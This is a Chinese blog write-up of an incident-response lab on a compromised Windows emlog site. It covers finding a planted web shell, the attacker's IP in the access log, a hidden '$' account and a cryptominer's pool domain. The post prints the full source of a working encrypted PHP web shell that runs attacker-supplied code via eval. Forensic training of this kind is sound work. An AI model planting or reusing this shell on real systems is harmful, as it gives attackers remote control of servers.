---
layout: post
title: 玄机——第四章-windows实战-emlog
---



上线后的第一个flag让我们提交黑客植入的shell。按惯例我们先查杀网站根目录。网站源码整个薅到本地直接报毒在`content/plugins/tips`文件夹下。内部有shell的密码

```bash
<?php
@error_reporting(0);
session_start();
    $key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
	$_SESSION['k']=$key;
	session_write_close();
	$post=file_get_contents("php://input");
	if(!extension_loaded('openssl'))
	{
		$t="base64_"."decode";
		$post=$t($post."");
		
		for($i=0;$i<strlen($post);$i++) {
    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
    			}
	}
	else
	{
		$post=openssl_decrypt($post, "AES128", $key);
	}
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __invoke($p) {eval($p."");}}
    @call_user_func(new C(),$params);
?>
```

接下来我们查看网站日志，来判断黑客攻击成功的IP。在`access.log`的日志尾部，我们可以看到大量向`shell.php` POST的数据。判断此黑客攻击的IP即为`192.168.126.1`

接下来我们需要查杀黑客的隐藏账户。渗透的权限维持技术发力了，我们直接`lusrmgr.msc`查看 用户组内的所有用户。发现一个`hacker138$`的恶意用户，一眼顶针。但请注意提交时需要去除`hacker138$`内的`$`符号，因为windows内此符号代表其为机器账户。

最后我们需要查找到黑客挖矿程序的矿池域名，并将名称作为flag提交。我们在hack138用户桌面下直接就找到了个`Kuang.exe`，有点幽默了。先使用pyinstxtractor反编译，再将反编译出的文件加上`.pyc`后找个在线反编译即可看到了。`http://wakuang.zhigongshanfang.top`